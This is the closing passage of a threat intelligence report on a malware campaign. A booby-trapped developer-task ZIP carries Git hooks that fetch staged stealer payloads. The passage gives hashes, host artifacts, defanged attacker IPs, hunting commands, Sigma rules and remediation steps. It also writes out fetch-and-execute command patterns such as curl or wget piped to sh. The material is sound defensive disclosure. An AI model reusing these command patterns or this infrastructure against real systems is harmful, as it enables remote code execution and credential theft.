| `karrem1281@outlook[.]sa` | Git/user email | Present in recovered Git config and HEAD commit metadata |

### File and Payload Hashes

Hashes are included for independent comparison with collected samples, staged payloads, and auxiliary native artifacts. The evidence archive itself is not distributed with this report.

| SHA-256 | File | Notes |
|---|---|---|
| `088bdef73a0ac20c29ace0fbac549b274c04ce65ebb743c47acf038b44315d4b` | `p2pcontract.zip` | Original developer task ZIP |
| `833e21d7e68b8dcbadc2930d659581e3d4a7b9b96fcac4453a91e86754dc12c2` | `.git/hooks/pre-commit`, `.git/hooks/pre-push` | Malicious Git hook script |
| `fcf46cf229b438225765ab033f038640fcec39f278434b9f82bb30767c9fa694` | Linux stage-1 script | Short.io-followed Linux stage |
| `90c4f07b197ea7adff80b3821fbec2c2bf2788dfa5c59bb838b16c96a1e48e57` | macOS stage-1 script | Short.io-followed macOS stage |
| `9e724076ae6cd46b323fd999166beca24b80562ffc1bd136cca3e2ba62b9c0ea` | Windows stage-1 script | Short.io-followed Windows stage |
| `ae6dc54065e2d111ad26c0eb624d0200dc48e8f1a906b3b0a778f032219e8437` | Stage-3 parser JavaScript | Obfuscated Node.js loader |
| `09a303aadcf362dfea8e6410f0424ea4eb199c053d331e1a54aee63db85b66ef` | Stage-4 JavaScript payload | Multi-module JS backdoor/stealer |
| `d98432b60071e217432ba56d5f89b2173df8388424b804e3d8e4ba5d6dbd94d0` | `/clw/hgMoMq7` | Windows `mod.pyd` Cython module |
| `d11f8e1512ade99b27f44ab9eeff417688e3ff75b7d41f1e8a65a1efe70a3ea0` | `/clw1/hgMoMq7` | macOS Mach-O Cython module |
| `a3d116d199d5dae30528cb1e3c5d416ba3c676f82b38285c401dc74ed81763c9` | `/pd2` | Windows Python runtime ZIP |

### Host Artifacts

```text
.git/hooks/pre-commit
.git/hooks/pre-push
$HOME/Documents/tokenlinux.npl
$HOME/Documents/tokenlinux.sh
$HOME/.task/tokenlinux.sh
$HOME/.task/node-v20.11.1-linux-x64.tar.xz
$HOME/.task/node-v20.11.1-darwin-x64.tar.xz
$HOME/.task/node-v20.11.1-linux-x64/
$HOME/.task/node-v20.11.1-darwin-x64/
$HOME/.vscode/f.js
$HOME/.vscode/package.json
$HOME/.vscode/node_modules/
%USERPROFILE%\parse
%USERPROFILE%	oken.cmd
.py2\py.exe
.py2\python312.dll
.mod
mod.pyd
mod.so
```

### Suspicious Process Patterns

```text
curl -s <shortlink> -L | sh
wget -qO- <shortlink> -L | sh
curl -s <shortlink> -L | cmd
nohup bash tokenlinux.sh
npm i --silent
npm --prefix <dir> i
node f.js
nohup node f.js
python3 .mod
py.exe .mod
cmd.exe /c <downloaded command>
powershell -WindowStyle Hidden
wmic logicaldisk get
```

## Detection and Hunting Guidance

### Network Detection

Look for HTTP requests to:

```text
chvsvr.short[.]gy/hgMoMq7*
165.140.86[.]190:3000/task/
78.142.218[.]26:1244/s/31d27f3f2f35
147.124.202[.]206:1244/f/hgMoMq7
147.124.202[.]206:1244/uploads
147.124.202[.]206:1244/clw
147.124.202[.]206:1244/clw1
45.59.163[.]50:1244/pd2
165.140.86[.]183:1247
165.140.86[.]183:2246
```

### Host Detection

Hunt for Git hooks containing network execution pipelines:

```bash
find . -path '*/.git/hooks/*' -type f -maxdepth 6 -print0   | xargs -0 grep -nE 'curl|wget|Invoke-WebRequest|cmd|sh|short\.gy|tokenlinux|/task/'
```

Hunt for suspicious local staging paths:

```bash
find "$HOME" -maxdepth 4 \(   -path '*/.task/*' -o   -path '*/.vscode/f.js' -o   -path '*/.vscode/package.json' -o   -name 'tokenlinux.sh' -o   -name 'tokenlinux.npl' -o   -name '.mod' -o   -name 'mod.pyd' -o   -name 'mod.so' \) -print
```

### Example Sigma-Style Logic

Potential Git hook execution:

```yaml
title: Git Hook Fetches and Executes Remote Script
status: experimental
logsource:
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - 'curl -s'
      - 'wget -qO-'
      - 'short.gy'
      - '| sh'
      - '| cmd'
  condition: selection
fields:
  - Image
  - CommandLine
  - ParentImage
  - CurrentDirectory
level: high
```

Potential stage-2 bootstrap behavior:

```yaml
title: Suspicious Node Runtime Staging Under User Task Directory
status: experimental
logsource:
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - '.task/node-v'
      - 'tokenlinux.sh'
      - '/task/parser'
      - 'nodejs.org/dist'
  condition: selection
level: medium
```

## Remediation

### If the ZIP Was Opened But Git Was Not Used

1. Do not run the project.
2. Do not commit, push, install dependencies, or open scripts in an executing environment.
3. Preserve the ZIP and original email as evidence.
4. Inspect `.git/hooks/` before any further handling.

### If Git Hooks May Have Executed

1. Disconnect the host from the network.
2. Preserve process, network, and filesystem telemetry.
3. Search for the host artifacts listed above.
4. Rotate credentials exposed through browsers, `.env` files, wallets, Git, cloud CLIs, package managers, and SSH keys.
5. Treat browser profiles and cryptocurrency wallets on the host as compromised.
6. Rebuild the system if stage 4 or auxiliary payload execution is confirmed.

### Account and Wallet Response

1. Revoke exposed API keys and OAuth tokens.
2. Rotate GitHub, GitLab, cloud, npm, wallet, and exchange credentials.
3. Move cryptocurrency funds from wallets present on the machine.
4. Review recent pushes, repository changes, SSH key usage, package publication activity, and cloud audit logs.

## Evidence Availability

The evidence package is not included with the public report. Public comparison material is provided through the file and payload hashes, decoded descriptors, campaign token, group marker, network indicators, host artifacts, and command patterns listed above.

Preserved evidence includes the original ZIP, hook files, static archive listings, Git metadata, Short.io redirect headers, platform stage scripts, JWT-gated staging responses, descriptor responses, stage-3 parser, stage-4 JavaScript payload, auxiliary native/Python artifacts, empty fallback responses, and expired-token responses. Empty bodies from redirect-only responses and inactive fallback endpoints were retained because they document infrastructure state at collection time.

## Collection and Analysis Boundaries

This report is based on static analysis and controlled retrieval of staged payloads. No recovered payload was executed as part of the analysis. The native Python/Cython modules were triaged through file metadata, imports, exports, symbols, and strings only. Further behavioral analysis requires a disposable, instrumented VM with strict outbound controls.

*TLP:CLEAR. This report may be freely shared. Attribution assessments are tentative and based on observed infrastructure, payload behavior, and TTP similarity. All IOCs are provided for defensive purposes. References to MansaTrade describe lure branding and observed sender/domain material. The public footprint appears recent and low-assurance, but the report does not determine whether the mailbox/domain was actor-created, compromised, legitimately operated, or otherwise misused, and does not imply involvement by any legitimate MansaTrade project, company, community, or brand owner.*

*Report ID: TP-2026-011 | Published: 2026-04-29 | Author: ThreatProphet*
